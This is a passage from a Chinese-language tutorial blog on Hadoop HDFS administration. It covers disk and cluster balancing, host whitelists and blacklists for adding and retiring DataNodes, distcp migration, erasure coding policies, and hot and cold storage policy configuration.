生成均衡计划（我们只有一块磁盘，不会生成计划）</span></span><br><span class="line">hdfs diskbalancer -plan hadoop103</span><br><span class="line"><span class="comment"># 执行均衡计划</span></span><br><span class="line">hdfs diskbalancer -execute hadoop103.plan.json</span><br><span class="line"><span class="comment"># 查看当前均衡任务的执行情况</span></span><br><span class="line">hdfs diskbalancer -query hadoop103</span><br><span class="line"><span class="comment"># 取消均衡任务</span></span><br><span class="line">hdfs diskbalancer -cancel hadoop103.plan.json</span><br></pre></td></tr></table></figure><h2 id="4、HDFS集群扩容及缩容-重要">4、HDFS集群扩容及缩容(重要)</h2><h3 id="4-1-添加白名单">4.1 添加白名单</h3><p>白名单：表示在白名单的主机IP地址可以，用来存储数据，而非白名单的节点只能作为客户端访问，无法存储数据。企业中：配置白名单，可以尽量防止黑客恶意访问攻击</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在NameNode节点的/opt/module/hadoop-3.1.3/etc/hadoop目录下分别创建whitelist 和blacklist文件</span></span><br><span class="line"><span class="comment"># 创建白名单</span></span><br><span class="line">vim whitelist</span><br><span class="line">hadoop102</span><br><span class="line">hadoop103</span><br><span class="line"><span class="comment"># 创建黑名单,保持空即可</span></span><br><span class="line">touch blacklist</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在hdfs-site.xml配置文件中增加dfs.hosts配置参数</span></span><br><span class="line">&lt;!-- 白名单 --&gt;</span><br><span class="line">&lt;property&gt;</span><br><span class="line">     &lt;name&gt;dfs.hosts&lt;/name&gt;</span><br><span class="line">     &lt;value&gt;/opt/module/hadoop-3.1.3/etc/hadoop/whitelist&lt;/value&gt;</span><br><span class="line">&lt;/property&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 黑名单 --&gt;</span><br><span class="line">&lt;property&gt;</span><br><span class="line">     &lt;name&gt;dfs.hosts.exclude&lt;/name&gt;</span><br><span class="line">     &lt;value&gt;/opt/module/hadoop-3.1.3/etc/hadoop/blacklist&lt;/value&gt;</span><br><span class="line">&lt;/property&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 分发配置文件whitelist，hdfs-site.xml</span></span><br><span class="line">xsync hdfs-site.xml whitelist</span><br><span class="line"><span class="comment"># 第一次添加白名单必须重启集群，不是第一次，只需要刷新NameNode节点即可</span></span><br><span class="line">myhadoop.sh stop</span><br><span class="line">myhadoop.sh start</span><br><span class="line"><span class="comment"># 在web浏览器上查看DN，http://hadoop102:9870/dfshealth.html#tab-datanode</span></span><br><span class="line"><span class="comment"># 在hadoop104上执行上传数据数据失败</span></span><br><span class="line"><span class="comment"># 二次修改白名单，增加hadoop104</span></span><br><span class="line"><span class="comment"># 刷新NameNode</span></span><br><span class="line">hdfs dfsadmin -refreshNodes</span><br></pre></td></tr></table></figure><h3 id="4-2-新增服务器节点">4.2 新增服务器节点</h3><p>随着公司业务的增长，数据量越来越大，原有的数据节点的容量已经不能满足存储数据的需求，需要在原有集群基础上动态添加新的数据节点</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 环境准备</span></span><br><span class="line"><span class="comment"># 在hadoop100主机上再克隆一台hadoop105主机</span></span><br><span class="line"><span class="comment"># 修改IP地址和主机名称</span></span><br><span class="line">vim /etc/sysconfig/network-scripts/ifcfg-ens33</span><br><span class="line">vim /etc/hostname</span><br><span class="line"><span class="comment"># 拷贝hadoop102的/opt/module目录和/etc/profile.d/my_env.sh到hadoop105</span></span><br><span class="line">scp -r module/* atguigu@hadoop105:/opt/module/</span><br><span class="line">sudo scp /etc/profile.d/my_env.sh root@hadoop105:/etc/profile.d/my_env.sh</span><br><span class="line"><span class="comment"># 去 105</span></span><br><span class="line"><span class="built_in">source</span> /etc/profile</span><br><span class="line"><span class="comment"># 删除hadoop105上Hadoop的历史数据，data和log数据</span></span><br><span class="line">rm -rf data/ logs/</span><br><span class="line"><span class="comment"># 配置hadoop102和hadoop103到hadoop105的ssh无密登录</span></span><br><span class="line">ssh-copy-id hadoop105</span><br><span class="line">ssh-copy-id hadoop105</span><br><span class="line"></span><br><span class="line"><span class="comment"># 服役新节点具体步骤</span></span><br><span class="line"><span class="comment"># 直接启动DataNode，即可关联到集群</span></span><br><span class="line">hdfs --daemon start datanode</span><br><span class="line">yarn --daemon start nodemanager</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在白名单中增加新服役的服务器</span></span><br><span class="line"><span class="comment"># 在白名单whitelist中增加hadoop104、hadoop105，并重启集群</span></span><br><span class="line">vim whitelist</span><br><span class="line"><span class="comment"># 分发与刷新</span></span><br><span class="line">xsync whitelist</span><br><span class="line">hdfs dfsadmin -refreshNodes</span><br><span class="line">Refresh nodes successful</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在hadoop105上上传文件</span></span><br><span class="line">hadoop fs -put /opt/module/hadoop-3.1.3/LICENSE.txt /</span><br></pre></td></tr></table></figure><h3 id="4-3-服务器间数据均衡">4.3 服务器间数据均衡</h3><p>在企业开发中，如果经常在hadoop102和hadoop104上提交任务，且副本数为2，由于数据本地性原则，就会导致hadoop102和hadoop104数据过多，hadoop103存储的数据量小。另一种情况，就是新服役的服务器数据量比较少，需要执行集群均衡命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 开启数据均衡命令</span></span><br><span class="line"><span class="comment"># 对于参数10，代表的是集群中各个节点的磁盘空间利用率相差不超过10%，可根据实际情况进行调整</span></span><br><span class="line">sbin/start-balancer.sh -threshold 10</span><br><span class="line"></span><br><span class="line"><span class="comment"># 停止数据均衡命令</span></span><br><span class="line">sbin/stop-balancer.sh</span><br><span class="line"><span class="comment"># 注意：由于HDFS需要启动单独的Rebalance Server来执行Rebalance操作，所以尽量不要在NameNode上执行start-balancer.sh，而是找一台比较空闲的机器</span></span><br></pre></td></tr></table></figure><h3 id="4-4-黑名单退役服务器">4.4 黑名单退役服务器</h3><p>黑名单：表示在黑名单的主机IP地址不可以，用来存储数据。企业中：配置黑名单，用来退役服务器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 编辑/opt/module/hadoop-3.1.3/etc/hadoop目录下的blacklist文件</span></span><br><span class="line">vim blacklist</span><br><span class="line"><span class="comment"># 添加如下主机名称（要退役的节点）</span></span><br><span class="line">hadoop105</span><br><span class="line"></span><br><span class="line"><span class="comment"># 注意：如果白名单中没有配置，需要在hdfs-site.xml配置文件中增加dfs.hosts配置参数</span></span><br><span class="line">!-- 黑名单 --&gt;</span><br><span class="line">&lt;property&gt;</span><br><span class="line">     &lt;name&gt;dfs.hosts.exclude&lt;/name&gt;</span><br><span class="line">     &lt;value&gt;/opt/module/hadoop-3.1.3/etc/hadoop/blacklist&lt;/value&gt;</span><br><span class="line">&lt;/property&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 分发配置文件blacklist，hdfs-site.xml</span></span><br><span class="line">xsync hdfs-site.xml blacklist</span><br><span class="line"><span class="comment"># 第一次添加黑名单必须重启集群，不是第一次，只需要刷新NameNode节点即可</span></span><br><span class="line">hdfs dfsadmin -refreshNodes</span><br><span class="line"><span class="comment"># 检查Web浏览器，退役节点的状态为decommission in progress（退役中），说明数据节点正在复制块到其他节点</span></span><br><span class="line"><span class="comment"># 等待退役节点状态为decommissioned（所有块已经复制完成），停止该节点及节点资源管理器。注意：如果副本数是3，服役的节点小于等于3，是不能退役成功的，需要修改副本数后才能退役</span></span><br><span class="line">hdfs --daemon stop datanode</span><br><span class="line">yarn --daemon stop nodemanager</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果数据不均衡，可以用命令实现集群的再平衡</span></span><br><span class="line">sbin/start-balancer.sh -threshold 10</span><br></pre></td></tr></table></figure><h3 id="4-5-HDFS—集群迁移">4.5 HDFS—集群迁移</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 采用scp拷贝数据</span></span><br><span class="line"><span class="comment"># 采用distcp命令实现两个Hadoop集群之间的递归数据复制</span></span><br><span class="line">bin/hadoop distcp hdfs://hadoop102:8020/user/atguigu/hello.txt hdfs://hadoop105:8020/user/atguigu/hello.txt</span><br></pre></td></tr></table></figure><h2 id="5、HDFS存储优化">5、HDFS存储优化</h2><h3 id="5-1-纠删码">5.1 纠删码</h3><blockquote><p>HDFS默认情况下，一个文件有3个副本，这样提高了数据的可靠性，但也带来了2倍的冗余开销。Hadoop3.x引入了纠删码，采用计算的方式，可以节省约50％左右的存储空间</p></blockquote><p><img src="http://qnypic.shawncoding.top/blog/202401251330939.png" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[atguigu@hadoop102 hadoop-3.1.3]$ hdfs ec</span><br><span class="line">Usage: bin/hdfs ec [COMMAND]</span><br><span class="line">          [-listPolicies]</span><br><span class="line">          [-addPolicies -policyFile &lt;file&gt;]</span><br><span class="line">          [-getPolicy -path &lt;path&gt;]</span><br><span class="line">          [-removePolicy -policy &lt;policy&gt;]</span><br><span class="line">          [-setPolicy -path &lt;path&gt; [-policy &lt;policy&gt;] [-replicate]]</span><br><span class="line">          [-unsetPolicy -path &lt;path&gt;]</span><br><span class="line">          [-listCodecs]</span><br><span class="line">          [-enablePolicy -policy &lt;policy&gt;]</span><br><span class="line">          [-disablePolicy -policy &lt;policy&gt;]</span><br><span class="line">          [-<span class="built_in">help</span> &lt;<span class="built_in">command</span>-name&gt;].</span><br><span class="line">          </span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看当前支持的纠删码策略</span></span><br><span class="line">hdfs ec -listPolicies</span><br></pre></td></tr></table></figure><ul><li>RS-3-2-1024k：使用RS编码，每3个数据单元，生成2个校验单元，共5个单元，也就是说：这5个单元中，只要有任意的3个单元存在（不管是数据单元还是校验单元，只要总数=3），就可以得到原始数据。每个单元的大小是1024k=1024*1024=1048576</li><li>RS-10-4-1024k：使用RS编码，每10个数据单元（cell），生成4个校验单元，共14个单元，也就是说：这14个单元中，只要有任意的10个单元存在（不管是数据单元还是校验单元，只要总数=10），就可以得到原始数据。每个单元的大小是1024k=1024*1024=1048576</li><li>RS-6-3-1024k：使用RS编码，每6个数据单元，生成3个校验单元，共9个单元，也就是说：这9个单元中，只要有任意的6个单元存在（不管是数据单元还是校验单元，只要总数=6），就可以得到原始数据。每个单元的大小是1024k=1024*1024=1048576(默认开启)</li><li>RS-LEGACY-6-3-1024k：策略和上面的RS-6-3-1024k一样，只是编码的算法用的是rs-legacy</li><li>XOR-2-1-1024k：使用XOR编码（速度比RS编码快），每2个数据单元，生成1个校验单元，共3个单元，也就是说：这3个单元中，只要有任意的2个单元存在（不管是数据单元还是校验单元，只要总数= 2），就可以得到原始数据。每个单元的大小是1024k=1024*1024=1048576</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 纠删码案例实操，将/input目录设置为RS-3-2-1024k策略</span></span><br><span class="line"><span class="comment"># 默认只开启对RS-6-3-1024k策略的支持，如要使用别的策略需要提前启用</span></span><br><span class="line"><span class="comment"># 开启对RS-3-2-1024k策略的支持</span></span><br><span class="line">hdfs ec -enablePolicy -policy RS-3-2-1024k</span><br><span class="line"><span class="comment"># 在HDFS创建目录，并设置RS-3-2-1024k策略</span></span><br><span class="line">hdfs dfs -mkdir /input</span><br><span class="line">hdfs ec -setPolicy -path /input -policy RS-3-2-1024k</span><br><span class="line"><span class="comment"># 上传文件，并查看文件编码后的存储情况</span></span><br><span class="line"><span class="comment"># 注：你所上传的文件需要大于2M才能看出效果。（低于2M，只有一个数据单元和两个校验单元）</span></span><br><span class="line">hdfs dfs -put web.log /input</span><br></pre></td></tr></table></figure><h3 id="5-2-异构存储（冷热数据分离）">5.2 异构存储（冷热数据分离）</h3><p><img src="http://qnypic.shawncoding.top/blog/202401251330940.png" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看当前有哪些存储策略可以用</span></span><br><span class="line">hdfs storagepolicies -listPolicies</span><br><span class="line"><span class="comment"># 为指定路径（数据存储目录）设置指定的存储策略</span></span><br><span class="line">hdfs storagepolicies -setStoragePolicy -path xxx -policy xxx</span><br><span class="line"><span class="comment"># 获取指定路径（数据存储目录或文件）的存储策略</span></span><br><span class="line">hdfs storagepolicies -getStoragePolicy -path xxx</span><br><span class="line"><span class="comment"># 取消存储策略；执行改命令之后该目录或者文件，以其上级的目录为准，如果是根目录，那么就是HOT</span></span><br><span class="line">hdfs storagepolicies -unsetStoragePolicy -path xxx</span><br><span class="line"><span class="comment"># 查看文件块的分布</span></span><br><span class="line">bin/hdfs fsck xxx -files -blocks -locations</span><br><span class="line"><span class="comment"># 查看集群节点</span></span><br><span class="line">hadoop dfsadmin -report</span><br></pre></td></tr></table></figure><p>我们这里进行测试，集群规划如下</p><table><thead><tr><th>节点</th><th>存储类型分配</th></tr></thead><tbody><tr><td>hadoop102</td><td>RAM_DISK，SSD</td></tr><tr><td>hadoop103</td><td>SSD，DISK</td></tr><tr><td>hadoop104</td><td>DISK，RAM_DISK</td></tr><tr><td>hadoop105</td><td>ARCHIVE</td></tr><tr><td>hadoop106</td><td>ARCHIVE</td></tr></tbody></table><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--为hadoop102节点的hdfs-site.xml添加如下信息--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.replication<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>2<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.storage.policy.enabled<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>true<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.datanode.data.dir<span class="tag">&lt;/<span class="name">name</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>[SSD]file:///opt/module/hadoop-3.1.3/hdfsdata/ssd,[RAM_DISK]file:///opt/module/hadoop-3.1.3/hdfsdata/ram_disk<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--为hadoop103节点的hdfs-site.xml添加如下信息--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.replication<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>2<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.storage.policy.enabled<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>true<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.datanode.data.dir<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>[SSD]file:///opt/module/hadoop-3.1.3/hdfsdata/ssd,[DISK]file:///opt/module/hadoop-3.1.3/hdfsdata/disk<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--为hadoop104节点的hdfs-site.xml添加如下信息--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.replication<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>2<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.storage.policy.enabled<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>true<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.datanode.data.dir<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>[RAM_DISK]file:///opt/module/hdfsdata/ram_disk,[DISK]file:///opt/module/hadoop-3.1.3/hdfsdata/disk<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--为hadoop105节点的hdfs-site.xml添加如下信息--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.replication<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>2<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.storage.policy.enabled<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>true<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.datanode.data.dir<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>[ARCHIVE]file:///opt/module/hadoop-3.1.3/hdfsdata/archive<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--为hadoop106节点的hdfs-site.xml添加如下信息--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.replication<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>2<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.storage.policy.enabled<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>true<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.datanode.data.dir<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>[ARCHIVE]file:///opt/module/hadoop-3.1.3/hdfsdata/archive<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 启动集群,注意要删除data和logs目录</span></span><br><span class="line">hdfs namenode -format</span><br><span class="line">myhadoop.sh start</span><br><span class="line"><span class="comment"># 并在HDFS上创建文件目录</span></span><br><span class="line">hadoop fs -mkdir /hdfsdata</span><br><span class="line">hadoop fs -put /opt/module/hadoop-3.1.3/NOTICE.txt /hdfsdata</span><br></pre></td></tr></table></figure><p>环境搭建完，下面详细介绍集中存储策略</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># =========================HOT存储策略案例========================</span></span><br><span class="line"><span class="comment"># 最开始我们未设置存储策略的情况下，我们获取该目录的存储策略</span></span><br><span class="line">hdfs storagepolicies -getStoragePolicy -path /hdfsdata</span><br><span class="line"><span class="comment"># 我们查看上传的文件块分布</span></span><br><span class="line">hdfs fsck /hdfsdata -files -blocks -locations</span><br><span class="line"><span class="comment"># 未设置存储策略，所有文件块都存储在DISK下。所以，默认存储策略为HOT</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># =======================WARM存储策略测试========================</span></span><br><span class="line"><span class="comment"># 我们为数据降温</span></span><br><span class="line">hdfs storagepolicies -setStoragePolicy -path /hdfsdata -policy WARM</span><br><span class="line"><span class="comment"># 再次查看文件块分布，我们可以看到文件块依然放在原处</span></span><br><span class="line">hdfs fsck /hdfsdata -files -blocks -locations</span><br><span class="line"><span class="comment"># 我们需要让他HDFS按照存储策略自行移动文件块</span></span><br><span class="line">hdfs mover /hdfsdata</span><br><span class="line"><span class="comment"># 再次查看文件块分布，文件块一半在DISK，一半在ARCHIVE，符合我们设置的WARM策略</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># =======================COLD策略测试============================</span></span><br><span class="line">hdfs storagepolicies -setStoragePolicy -path /hdfsdata -policy COLD</span><br><span class="line"><span class="comment"># 注意：当我们将目录设置为COLD并且我们未配置ARCHIVE存储目录的情况下，不可以向该目录直接上传文件，会报出异常</span></span><br><span class="line"><span class="comment"># 手动转移</span></span><br><span class="line">hdfs mover /hdfsdata</span><br><span class="line">bin/hdfs fsck /hdfsdata -files -blocks -locations</span><br><span class="line"></span><br><span class="line"><span class="comment"># ======================ONE_SSD策略测试==========================</span></span><br><span class="line"><span class="comment"># 接下来我们将存储策略从默认的HOT更改为One_SSD</span></span><br><span class="line">hdfs storagepolicies -setStoragePolicy -path /hdfsdata -policy One_SSD</span><br><span class="line"></span><br><span class="line"><span class="comment"># =====================ALL_SSD策略测试===========================</span></span><br><span class="line">hdfs storagepolicies -setStoragePolicy -path /hdfsdata -policy All_SSD</span><br><span class="line"></span><br><span class="line"><span class="comment"># =====================LAZY_PERSIST策略测试=======================</span></span><br><span class="line">hdfs storagepolicies -setStoragePolicy -path /hdfsdata -policy lazy_persist</span><br><span class="line"><span class="comment"># 这里我们发现所有的文件块都是存储在DISK，按照理论一个副本存储在RAM_DISK，其他副本存储在DISK中，这是因为，我们还需要配置“dfs.datanode.max.locked.memory”，“dfs.block.size”参数</span></span><br><span class="line"><span class="comment"># 